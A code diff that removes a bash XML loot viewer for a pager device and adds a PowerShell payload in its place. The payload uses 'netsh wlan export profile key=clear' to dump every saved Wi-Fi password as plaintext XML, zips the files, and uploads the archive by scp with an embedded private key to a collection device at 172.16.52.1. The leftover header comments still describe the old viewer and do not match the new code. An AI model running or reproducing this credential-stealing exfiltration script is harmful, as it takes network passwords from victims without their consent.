@@ -5,101 +5,86 @@
 # to be viewed thru the log viewer.
 # Version: 1.2
 
-TARGET_DIR="/mmc/root/loot/wifi"
-TMP_FILE="/tmp/pager_xml_view.txt"
+# Creates a dir named wifi in the %TEMP% dir
+mkdir "$env:TEMP\wifi"
 
-# ---- sanity checks ----
-if [ ! -d "$TARGET_DIR" ]; then
-    ERROR_DIALOG "Directory not found"
-    exit 0
-fi
+#Exports all wifi credentials
+netsh wlan show profiles
 
-if ! command -v unzip >/dev/null 2>&1; then
-    ERROR_DIALOG "unzip not installed"
-    exit 0
-fi
+# Dumps all wifi credentials to seperate .xml files
+netsh wlan export profile key=clear folder="$env:TEMP\wifi"
 
-# ---- unzip all zip files in target dir ----
-START_SPINNER
+# Creats an archive of all files named wifi.zip in %TEMP%\wifi
+Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force #
 
-FOUND_ZIP=0
+# wifi pager scp upload cmd using public key instead of password to upload to pager
+$ErrorActionPreference = "Stop"
 
-while IFS= read -r -d '' zipfile; do
-    FOUND_ZIP=1
-    unzip -o "$zipfile" -d "$TARGET_DIR" >/dev/null 2>&1
-done < <(find "$TARGET_DIR" -maxdepth 1 -type f -iname "*.zip" -print0)
+# ---- CONFIG ----
+$PagerIP   = "172.16.52.1"
+$PagerUser = "root"
+$LocalFile = Join-Path $env:TEMP "wifi\wifi.zip"
+$RemoteDir = "/mmc/root/loot/wifi/"
+$TempKey   = Join-Path $env:TEMP ("pager_key_" + [guid]::NewGuid().ToString())
 
-STOP_SPINNER
+# ---- PASTE BASE64 OF YOUR WORKING PRIVATE KEY FILE BELOW ----
+$PrivateKeyB64 = @'<INSERT AUTHORIZED KEY BETWEEN THE "@' '@" No "< >" 
+>'@
 
-# ---- completion popup, user dismisses and continues ----
-PROMPT "All loot files processed!"
-
-# ---- build XML file list ----
-mapfile -t XML_FILES < <(find "$TARGET_DIR" -maxdepth 1 -type f -iname "*.xml" | sort)
-
-if [ "${#XML_FILES[@]}" -eq 0 ]; then
-    ERROR_DIALOG "No XML files found"
-    exit 0
-fi
-
-build_picker_args() {
-    local title="$1"
-    local default="$2"
-    shift 2
-
-    local args=()
-    args+=("$title")
-
-    local item
-    for item in "$@"; do
-        args+=("$item")
-    done
-
-    args+=("$default")
-    printf '%s\n' "${args[@]}"
+function Test-CommandExists {
+    param([string]$Name)
+    [bool](Get-Command $Name -ErrorAction SilentlyContinue)
 }
 
-OPTIONS=()
-for f in "${XML_FILES[@]}"; do
-    OPTIONS+=("$(basename "$f")")
-done
+try {
+    if (-not (Test-Path $LocalFile)) {
+        throw "File not found: $LocalFile"
+    }
 
-DEFAULT="${OPTIONS[0]}"
+    if (-not (Test-CommandExists "scp")) {
+        throw "scp not found in PATH"
+    }
 
-mapfile -t PICKER_ARGS < <(build_picker_args "XML Viewer" "$DEFAULT" "${OPTIONS[@]}")
-SELECTED=$(LIST_PICKER "${PICKER_ARGS[@]}") || exit 0
+    if (-not (Test-CommandExists "ssh-keygen")) {
+        throw "ssh-keygen not found in PATH"
+    }
 
-SELECTED_PATH=""
-for f in "${XML_FILES[@]}"; do
-    if [ "$(basename "$f")" = "$SELECTED" ]; then
-        SELECTED_PATH="$f"
-        break
-    fi
-done
+    $keyBytes = [Convert]::FromBase64String(($PrivateKeyB64 -replace '\s',''))
+    [IO.File]::WriteAllBytes($TempKey, $keyBytes)
 
-if [ -z "$SELECTED_PATH" ] || [ ! -f "$SELECTED_PATH" ]; then
-    ERROR_DIALOG "Selected file missing"
-    exit 0
-fi
+    if (-not (Test-Path $TempKey)) {
+        throw "Failed to create temporary key file"
+    }
 
-# ---- format XML if xmllint exists, else copy raw ----
-START_SPINNER
-if command -v xmllint >/dev/null 2>&1; then
-    xmllint --format "$SELECTED_PATH" > "$TMP_FILE" 2>/dev/null || cp "$SELECTED_PATH" "$TMP_FILE"
-else
-    cp "$SELECTED_PATH" "$TMP_FILE"
-fi
-STOP_SPINNER
+    icacls $TempKey /inheritance:r | Out-Null
+    icacls $TempKey /grant:r "$($env:USERNAME):(R)" | Out-Null
 
-# ---- show selected XML in log viewer ----
-LOG clear
-LOG blue "XML Viewer"
-LOG blue "File: $SELECTED"
-LOG blue "Path: $SELECTED_PATH"
-LOG blue "--------------------------------"
+    & ssh-keygen -y -f $TempKey | Out-Null
+    if ($LASTEXITCODE -ne 0) {
+        throw "Embedded private key is invalid or unreadable"
+    }
 
-while IFS= read -r line; do
-    LOG "$line"
-done < "$TMP_FILE"
+    & ssh-keygen -R $PagerIP | Out-Null 2>$null
 
-exit 0
+    & scp `
+        -i $TempKey `
+        -o StrictHostKeyChecking=accept-new `
+        -o IdentitiesOnly=yes `
+        $LocalFile `
+        "${PagerUser}@${PagerIP}:${RemoteDir}"
+
+    if ($LASTEXITCODE -ne 0) {
+        throw "scp failed with exit code $LASTEXITCODE"
+    }
+
+    Write-Host "Upload SUCCESS: $LocalFile -> ${PagerUser}@${PagerIP}:${RemoteDir}"
+}
+catch {
+    Write-Error $_.Exception.Message
+    exit 1
+}
+finally {
+    if (Test-Path $TempKey) {
+        Remove-Item $TempKey -Force -ErrorAction SilentlyContinue
+    }
+}
